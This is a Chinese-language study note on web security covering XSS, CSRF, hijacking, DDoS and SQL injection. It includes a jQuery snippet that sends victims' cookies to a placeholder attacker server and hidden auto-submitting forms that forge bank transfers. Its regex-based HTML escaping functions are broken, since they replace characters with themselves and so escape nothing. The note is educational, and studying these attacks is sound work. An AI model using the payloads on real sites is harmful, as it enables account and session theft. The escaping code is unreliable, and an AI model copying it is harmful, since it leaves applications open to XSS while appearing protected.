# 网络安全

- [XSS (Cross Site Scripting) 跨站脚本攻击](#xss-cross-site-scripting-%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB)
- [CSRF/XSRF (Cross-site request forgery) 跨站请求伪造](#csrfxsrf-cross-site-request-forgery-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0)
- [网络劫持](#%E7%BD%91%E7%BB%9C%E5%8A%AB%E6%8C%81)
- [DDOS 攻击](#ddos-%E6%94%BB%E5%87%BB)
- [SQL 注入](#sql-%E6%B3%A8%E5%85%A5)
- [SQL 防护](#sql-%E9%98%B2%E6%8A%A4)
- [控制台注入代码](#%E6%8E%A7%E5%88%B6%E5%8F%B0%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81)

## XSS (Cross Site Scripting) 跨站脚本攻击

XSS 是恶意 web 用户将代码植入到提供给其它用户使用的页面中。在web前端方面，可以简单的理解为一种javascript代码注入。

场景：

在某些论坛的评论中，插入了 ajax 代码，在其他人访问该页面时，可以获取他人在当前域名下的 cookie 并发送到的服务器上。

注入代码：
```js
$.ajax({
    url: '自己的服务器',
    dataType: 'jsonp',
    data: {'盗取的用户cookie': document.cookie}
});
```

防范措施：  
1、将前端输出数据都进行转义。  
2、使用 cookie 的 HttpOnly 属性保护好 cookie。  

两种转义和反转义的方式：

```js
var HtmlUtil = {
		/*1.用浏览器内部转换器实现html转码*/
  htmlEncode: function(html) {
    //1.首先动态创建一个容器标签元素，如DIV  
    var temp = document.createElement("div");
    //2.然后将要转换的字符串设置为这个元素的innerText(ie支持)或者textContent(火狐，google支持)  
    (temp.textContent != undefined) ? (temp.textContent = html) : (temp.innerText = html);
    //3.最后返回这个元素的innerHTML，即得到经过HTML编码转换的字符串了  
    var output = temp.innerHTML;
    temp = null;
    return output;
  },
  /*2.用浏览器内部转换器实现html解码*/
  htmlDecode: function(text) {
    //1.首先动态创建一个容器标签元素，如DIV  
    var temp = document.createElement("div");
    //2.然后将要转换的字符串设置为这个元素的innerHTML(ie，火狐，google都支持)  
    temp.innerHTML = text;
    var output = temp.innerText || temp.textContent;
    temp = null;
    return output;
  },
  /*3.用正则表达式实现html转码*/
  htmlEncodeByRegExp: function(str) {
    var s = "";
    if (str.length == 0) return "";
    s = str.replace(/&/g, "&");
    s = s.replace(/</g, "<");
    s = s.replace(/>/g, ">");
    s = s.replace(/ /g, " ");
    s = s.replace(/\'/g, "'");
    s = s.replace(/\"/g, '"');
    return s;
  },
  /*4.用正则表达式实现html解码*/
  htmlDecodeByRegExp: function(str) {
    var s = "";
    if (str.length == 0) return "";
    s = str.replace(/&/g, "&");
    s = s.replace(/</g, "<");
    s = s.replace(/>/g, ">");
    s = s.replace(/ /g, " ");
    s = s.replace(/'/g, "\'");
    s = s.replace(/"/g, "\"");
    return s;
  }
};
```

## CSRF/XSRF (Cross-site request forgery) 跨站请求伪造

CSRF 是利用受信任网站中的一些不安全的提交行为，在你访问黑客的网站时，黑客的网站会盗用了你的身份，以你的名义发送恶意请求到受信任网站上。

要完成一次 CSRF 攻击，受害者必须完成：

- 登录受信任网站 A，并在本地生成 cookie
- 在不登出 A 的情况下，访问危险网站 B

场景：

某银行网站 A，它以 GET 请求来完成银行转账的操作，如：
```html
http://www.mybank.com/transfer.php?toBankId=11&money=1000
```
而某危险网站 B，它页面中含有一段 HTML 代码如下：
```html
<img src=http://www.mybank.com/transfer.php?toBankId=11&money=1000>
```

由于你此前登录银行网站 A 且还未退出，这时候你的浏览器会带上你的银行网站 A 的 Cookie 发出 GET 请求，结果银行服务器收到请求后，认为这是一条合法的更新资源的操作，所以立刻进行转账操作，这样就完成了一次简单的跨站请求伪造。

如果银行使用了 post 请求，危险网站 B 将其页面代码修改了下：
```html
<body onload="steal()">
  <iframe name="steal" display="none">
    <form method="POST" name="transfer"　action="http://www.myBank.com/transfer.php">
      <input type="hidden" name="toBankId" value="11">
      <input type="hidden" name="money" value="1000">
    </form>
  </iframe>
</body>
```

这里危险网站 B 暗地里发送了 POST 请求到银行，通过一个隐藏的自动提交的表单来提交请求，同样地完成了转账操作。

防范措施：

- 1、避免数据操作类的行为使用 get 请求，只接受 POST 请求。
- 2、使用需要用户进行互动的验证码。
- 4、使用随机的 Token，使攻击者无法准确预测。
- 3、检测 Referer（Referer：告诉服务器我是从哪个页面链接过来的）。

## 网络劫持

很多的时候，我们的网站不是直接就访问到我们的服务器上的，中间会经过很多层代理，如果在某一个环节，数据被中间代理层的劫持者所截获，他们就能获取到使用你网站的用户的密码等保密数据。  
比如，我们的用户经常会在各种饭馆里面，连一些奇奇怪怪的wifi，如果这个wifi是黑客所建立的热点wifi，那么黑客就可以结果该用户收发的所有数据。

建议站长们网站都使用https进行加密。这样，就算网站的数据能被拿到，黑客也无法解开。

## DDOS 攻击

分布式拒绝服务(DDoS:Distributed Denial of Service)攻击指借助于客户/服务器技术，将多个计算机联合起来作为攻击平台，对一个或多个目标发动DDoS攻击，从而成倍地提高拒绝服务攻击的威力。

DDOS 攻击利用目标系统网络服务功能缺陷或者直接消耗其系统资源，使得该目标系统无法提供正常的服务。

DDoS 攻击通过大量合法的请求占用大量网络资源，以达到瘫痪网络的目的。 具体有几种形式：

- 通过使网络过载来干扰甚至阻断正常的网络通讯；
- 通过向服务器提交大量请求，使服务器超负荷；
- 阻断某一用户访问服务器；
- 阻断某服务与特定系统或个人的通讯。

## SQL 注入

所谓 SQL 注入，就是通过把 SQL 命令插入到 Web 表单提交或页面请求的查询字符串，最终达到向服务器执行恶意的 SQL 命令。

## SQL 防护

- 永远不要信任用户的输入: 对用户的输入进行校验，可以通过正则表达式，或限制长度；对单引号和双"-"进行转换等。
- 永远不要使用动态拼装 SQL，可以使用参数化的 SQL 或者直接使用存储过程进行数据查询存取。
- 永远不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接。
- 不要把机密信息直接存放，加密或者 hash 掉密码和敏感的信息。

## 控制台注入代码

黑客会诱骗用户去往控制台里面粘贴代码，获取用户的信息。

See Also

[聊一聊WEB前端安全那些事儿](https://segmentfault.com/a/1190000006672214)  
[谈谈对 Web 安全的理解](https://juejin.im/entry/58bad941128fe100643fb35b)  
[JS对HTML字符的转义和反转义](https://blog.csdn.net/u013026207/article/details/53994032)  
